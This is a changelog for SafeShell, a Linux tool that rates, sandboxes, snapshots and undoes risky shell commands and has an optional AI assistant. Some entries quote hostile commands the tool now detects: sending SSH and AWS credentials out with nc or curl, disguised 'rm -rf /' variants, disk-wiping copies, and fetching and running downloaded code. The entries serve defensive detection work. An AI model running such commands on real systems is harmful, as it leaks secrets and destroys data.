# Changelog

All notable changes to SafeShell. Versions follow [semantic versioning](https://semver.org/).

## 1.5.0 - 2026-11-19

Undo you can trust, and an assistant that understands what you are doing.

### Added
- `safeshell undo` shows which snapshot it will restore (the command, when it ran, the folder and the number of files) and asks first. With no ID it offers the newest from this terminal, then this folder, then any. With no one to ask it restores nothing and prints the exact `safeshell undo ID --yes`. (#93)
- Undo never overwrites newer work without a full `yes`: files changed since the command ran are listed first. A snapshot already restored is marked undone and skipped by default. (#92)
- Snapshot limits: the size and the free disk space are checked before anything is copied, and after each snapshot the oldest are deleted once older than 30 days or together over 5 GiB (`snapshots.keep_days` and `snapshots.max_gib` in config.json). `safeshell snapshots prune [--older 30d] [--max 5G]` does it on demand, and `safeshell snapshots` shows the total. (#94)
- The English assistant understands context. It is told the project in the current folder (git branch, Makefile targets, npm scripts, go.mod, Python, Rust and Docker files; read only, nothing is run) and the commands SafeShell saw in the last 30 minutes. (#175)
- Follow-ups: each terminal remembers its last 5 English exchanges for 30 minutes (private file, secrets masked), so "now do the same for the logs folder", "now delete them" or "undo that" work. (#175)
- `safeshell ai bench` also measures 20 requests that need context or follow-ups, reported per category and kept apart from the original 49. (#175)
- An architecture test fails CI when a pure package touches files, processes or the network, or when anything but `cmd/safeshell` imports the engine. (#174)

### Changed
- Without a sandbox result (no user namespaces, or the preview failed), the files a command names (rm, mv, cp, sed -i, truncate, chmod -R, redirects and similar) are snapshotted, and when none can be named you are told it cannot be undone. (#98)
- A script that runs sudo, su, pkexec, doas or runuser is no longer shown as "changes no files": the preview cannot show what it would do as root, so it is never run unattended. (#71)
- The assistant is told never to fill in a made-up value such as `user@server` and to use the context before asking you. With a cloud model, the project facts, recent commands and recent exchanges are sent too, secrets masked; `safeshell help privacy` lists everything. (#175)

### Fixed
- A pipe, socket or unreadable folder no longer cancels the whole snapshot: pipes are recreated, sockets and devices are recorded, and what could not be read is listed when the snapshot is saved and at undo. (#95)
- Undo keeps hard links: a file with other names is written back in place, or the other names are reported as not restored. (#96)
- "Verified" now also checks modification times, permissions and owners (which undo restores), and reports new files added to a saved folder. (#97)
- After a preview timed out, changes in extra mounts were missing from the report and the snapshot. (#55)
- Downloads stop at the pinned size, so a server that keeps sending cannot fill the disk, and settings and keys are always written through a fresh private file. (#77)
- The home folder the rules protect is passed in rather than read inside the rules, so a home outside `/home` is always protected. (#173)
- An answer longer than 4096 characters to one of the assistant's questions no longer spills into the next question. Thanks to @ShahadatTest. (#171)

## 1.4.0 - 2026-11-16

Shared rules: administrators can set a team policy, and the remaining ways of hiding a command from the checks are closed.

### Added
- Team policy: on a shared machine an administrator can put rules in `/etc/safeshell/policy.json` that apply to everyone and can only make SafeShell stricter: `block` a command with a reason (no "do it anyway"), raise its `min_level`, or require a `snapshot` first. A rule that tries anything else is rejected with a clear error. The file must belong to root and be writable by no one else, or it is ignored with a warning on every check. `safeshell doctor` and `safeshell help policy` show it. It is a guard rail in each person's SafeShell, not access control. (#28)

### Changed
- Before anything is sent to a cloud AI, secret values are hidden as `***`, the same way as in the audit log: tokens, keys, passwords, Authorization headers, JSON secret fields, `user:pass@` in web addresses and `-u user:pass`. Local models are unchanged. (#75)
- `fc` (other than `fc -l`) and zsh `r` are blocked: they run an edited or old command from inside the shell, which SafeShell cannot check or preview. Type the command out instead. (#90)

### Fixed
- Words are read the way the shell reads them, so `r\m -rf /`, `'r'm` and `"r"m` are recognised as `rm`. (#44)
- Literal text fed to a shell is checked like `sh -c`: here-documents, here-strings, `printf ... | sh`, `echo ... | bash`, `cat <<X | sh` and `source /dev/stdin`. (#42)
- Commands inside `su -c`, `runuser`, `pkexec`, `nsenter`, `watch`, `flock`, `strace`, GNU `parallel`, `chroot` and `env -C` are checked; `su`, `runuser` and `pkexec` count as running as root. (#46)
- GNU sed's `e` (run a command) and `w` (write a file) are rated by what they do. (#43)
- `git push origin +main` and `git push --mirror` are rated like `--force`, and the safer option is never the same command. (#45)
- `sudo echo hi > out.txt` is R2: the redirect is opened by your shell, not by root. `sudo tee` is unchanged. (#47)
- `pkill -u root` is R4, and a very short `pkill` pattern (such as `sh`, which also matches bash, zsh and sshd) is R3 unless `-x` asks for the exact name. (#48)

## 1.3.0 - 2026-11-14

Trust the sandbox and undo: undo never deletes what it should keep or follows a swapped-in link, secrets stay out of the log, the daemon protects the right shell, and the released `.deb` is a complete Debian package.

### Changed
- The audit log and snapshot records hide secrets: values of `*TOKEN*`, `*KEY*`, `*SECRET*` and `*PASSWORD*` settings, `Authorization:` and similar headers, JSON fields with those names, passwords in web addresses (`https://user:pass@host`) and `-u user:pass` are replaced by `***`. Lines you start with a space are not logged, like shell history. The log keeps one old copy once it passes 5 MB, and its folder and the snapshot folder are made private to you. (#74)
- A `keys.json` that other users can read is refused with the `chmod 600` to run, instead of being used. (#57)
- `safeshell version` prints the same form (`safeshell 1.3.0`) whichever way it was built. (#67)
- The `.deb` now has the man page, copyright file, `Recommends: apparmor`, the real maintainer, and the AppArmor profile as a conffile, so your edits survive upgrades. Its install script acts only when configuring. (#64)
- CI builds the Debian package from `debian/` on Debian unstable with lintian, checks the `.deb` contents, and runs the integration tests and the full sweep with the real sandbox on every pull request. The release workflow checks that the PR comes from this repository, that the tag is new, and that both changelogs mention the version. (#65)

### Fixed
- `safeshell undo` could delete a file that appeared after the check (for example a download finishing while you read the question) and still say "Verified". Such a file is now saved and restored instead. (#53)
- Undo no longer follows a link swapped into a parent folder after the snapshot, and only accepts real snapshot ids (`safeshell undo ../../x` is refused). Links that were already there, such as `/bin` or a linked projects folder, still work. (#78)
- Through the daemon, `kill -9 <your shell>` and `pkill bash` were rated R2 instead of R4, because the daemon protected its own parents. It now protects the shell that asked, identified by the kernel. (#51)
- Ctrl-C during `analyze`, `simulate` or a check left the sandbox's scratch folder in RAM until logout. It is now removed, and folders left by earlier runs are cleaned up. Ctrl-C during a check cancels the line. (#52)
- Saving an API key when `keys.json` was damaged wiped your other keys. The file is now left alone and the message says how to fix it. (#57)
- Unpacking the AI engine could write outside its folder through chained links in the archive; every write now stays inside. (#54)
- The man page, usage text and `help commands` list every command, the environment variables and the exit codes; a test keeps them in step. The systemd unit finds SafeShell whether it came from the `.deb` or `install.sh`. (#67)

## 1.2.0 - 2026-11-14

Learn and see more: SafeShell now shows what a git, docker, kubectl or database command would lose before you approve it, explains commands as you work, and keeps a readable history of its decisions.

### Added
- Read-only previews in `analyze` and before you approve a risky command:
  - git: the changed files and the commits no other branch still has that `reset --hard`, `checkout --`, `restore`, `clean -f`, `push --force`, `branch -D` and `stash drop/clear` would lose. Nothing is fetched and no repository hook or filter runs. (#26)
  - docker and kubectl: the containers, images, networks, volumes and cluster objects that `docker rm`, `prune` and `kubectl delete` would remove. Volumes, namespaces and persistent volumes are rated R3. (#27)
  - Databases: how many rows a `DELETE`, `UPDATE`, `DROP TABLE` or `TRUNCATE` in `psql -c`, `mysql -e` or `sqlite3 FILE` would touch, and how many keys a `redis-cli` delete would remove. Counting runs read-only and never sends your statement. A change to 1,000 rows or more is blocked unless you override. (#86)
- `safeshell history [-n N] [--json]` shows what SafeShell decided, newest first. Thanks to @chiragjangiir. (#32)
- Learning mode: `safeshell learn on` prints one line after each command that passes, saying what it does and the safer form. `safeshell help learn` explains it. (#25)
- `safeshell deactivate` and `safeshell activate` turn checking off and on in every terminal at once, open ones included, with nothing to restart. `SAFESHELL_OFF=1` still pauses one terminal. `safeshell help pause` explains it.
- `safeshell tour`: a one-minute walk-through (a read, a blocked `rm -rf`, a snapshot and an undo) in a throwaway folder. (#88)

### Changed
- `safeshell doctor` checks every part: the hook (installed, and active in this terminal), the daemon, snapshots, the AI and the cloud key state (never the key itself), and says when checking is paused. (#88)
- JSON output: effects can have the new kind `database`.

### Fixed
- Sending secret files over the network (`cat ~/.ssh/id_rsa | nc host 80`, `curl -T ~/.aws/credentials`, ...) is rated R3 instead of R1. (#73)
- Commands that run later are rated by what they will run: `alias`, `trap`, `PROMPT_COMMAND`, `crontab` and lines appended to `~/.bashrc` and other startup files. (#72)
- A long `XDG_RUNTIME_DIR` no longer breaks the daemon with "bind: invalid argument". The socket path limit is now Linux's, and the message says which folder to use. Thanks to @Soham1660. (#123)
- `/models` says when an environment variable such as `GEMINI_API_KEY` overrides the key you saved, instead of silently ignoring the saved one. Thanks to @Soham1660. (#126)

### Contributors
Welcome to two new contributors: @Soham1660 (#134, #135) and @chiragjangiir, who wrote `safeshell history` (#69).

## 1.1.1 - 2026-11-13

A safety release: it closes the worst classifier and hook bypasses and hardens the sandbox, the daemon socket and printing.

### Added
- `/models` → `choose N` and `safeshell models list` show the models your own API key can use and save your pick. (#131, #133)
- `safeshell explain --why <command>` shows which rule and which evidence set the level, without the AI. (#87)
- `safeshell voice setup` offers to install what it needs (`cmake`, `g++`, `make`, and `pipewire-bin` when there is no recorder) with `sudo apt-get`, after asking. `--yes` skips the question. (#136)

### Changed
- Cloud defaults: OpenAI `gpt-6-luna`, Gemini `gemini-3.5-flash-lite`; Claude is unchanged. The prompt ignores filler words, reads typos as the intended word, and asks instead of guessing a deletion for a vague "clean up". `safeshell ai bench` has 49 requests. (#131)
- An AI-proposed line that changes your shell (alias, trap, export, function, source, ...) asks `[y/N]` even when it is otherwise allowed. Lines you type yourself are unchanged. (#132)
- Commands in the sandbox have no terminal: `/dev/tty` is gone and they start in their own session. Ctrl-C no longer reaches them; the timeout still ends them. (#130)
- Without an absolute `XDG_RUNTIME_DIR` there is no daemon; commands are checked directly and `safeshell daemon` says why. (#83)
- CI runs one check per part and requires 100% coverage of changed lines. (#68)
- Internal clean-up: shared helpers, consistent messages, more tests. `internal/ai/cloud` is now `internal/ai/anthropic`. (#136)

### Fixed
- Every subcommand answers `-h`/`--help` with its help and does nothing else; `safeshell uninstall --help` used to uninstall. `--` ends the options, and an unknown option exits 2 and says what to run. (#63)
- Global options before a subcommand no longer hide it (`git -C repo reset --hard`), and `cp`/`tee` are rated by their target (`cp /dev/zero /dev/sda`). (#39, #40)
- `exec > /etc/passwd`, `bash -lc '...'`, `find -exec sh -c '...'` and wrapper options such as `exec -a ls rm -rf /` are looked into. (#36, #37, #38, #41)
- "Changes no files" is no longer trusted when the sandbox could not see a folder you can write to. (#50)
- The bash hook checks lines in vi mode and from Ctrl-X Ctrl-E, and keeps working under `set -u` / `setopt nounset`. (#58, #59)
- Security: the hook only talks to a daemon socket you own (checked with the peer's user id). File names, command output and AI text are printed with control and invisible characters shown as escapes, and an AI command with hidden characters is refused. Sandboxed commands can't reach your real terminal. (#83, #130, #132)

## 1.1.0 - 2026-11-12

### Added
- Voice: `safeshell voice` (or Ctrl-X Ctrl-V in the shell hook) turns speech into a request on your machine with whisper.cpp. The text then goes through the same checks as typed text. `safeshell voice setup` downloads and builds the engine and model, both pinned by checksum. (#13)
- The AI asks one short question when a request is missing a detail, instead of giving up. It never asks you to confirm a dangerous request. (#22)
- A `.deb` for arm64 as well as amd64. (#14)
- `--verbose` on `analyze` and `simulate` shows every sandbox note.

### Changed
- `analyze` and `simulate` show only the sandbox notes about folders the command touches. When that can't be worked out, every note is shown. (#12)
- JSON output: `sim.Warnings` is now a list of `{paths, text}` objects instead of strings.
- `safeshell ai bench` has 44 requests (one new ambiguous request where a question is the right answer).

### Fixed
- `\rm`, `/bin/rm` and `busybox rm` are recognised like `rm`. (#8)
- Running downloaded code is blocked in more forms: `source <(curl ...)`, `. <(curl ...)`, `eval "$(curl ...)"`, `sh -c "$(curl ...)"`, `sh -s` and `source /dev/stdin`. (#9, #17)
- Rule gaps: perl, ruby and python mass deletes, `cp /dev/null file`, `gpg --delete-secret-keys` and `git filter-branch`/`filter-repo` are rated by how hard they are to undo. (#11)
- `install.sh` asks before installing the AppArmor profile unless `--yes` is given. Thanks to @ShahadatTest for the first outside contribution. (#10)

## 1.0.0 - 2026-11-07

First stable release.

### Safety layer
- Rates every command R0 to R4 by how reversible it is, with a rule set covering files, disks, git, containers, Kubernetes, databases, packages, services, networking and cloud tools.
- Rootless sandbox (user, mount, PID and network namespaces with OverlayFS) that shows the real file changes, with the network blocked and every connection attempt recorded.
- Real-world checks for processes, disks, packages and services a command would affect.
- Blocks with a reason and a safer alternative; "do it anyway" is always the user's choice.
- Snapshots before approved risky commands, and `safeshell undo` with verification.
- bash and zsh hooks that fail open with a visible warning if SafeShell itself breaks; optional background daemon for faster checks.

### AI assistant (optional)
- Plain English to a command that is checked like any other; the AI can only raise a risk level.
- Built-in local model (default Qwen2.5-Coder 3B) with a managed, checksum-verified llama.cpp engine (CUDA, Vulkan or CPU), or your own Claude, GPT or Gemini key.
- `/models` menu, `safeshell help`, and `safeshell ai bench` (43 labelled requests).

### Packaging
- The command is `safeshell` (`/usr/bin/ss` belongs to `iproute2`).
- Linux amd64 and arm64 tarballs, a `.deb`, and a Debian source package; PPA at `ppa:samarthsinh/safeshell` for the newest Ubuntu.

### Measured
- 92.3% exact on a held-out set of 220 commands; 97% on the English-to-command benchmark (local Qwen 3B); 492 labelled commands run through the real binary with no change outside the sandbox.
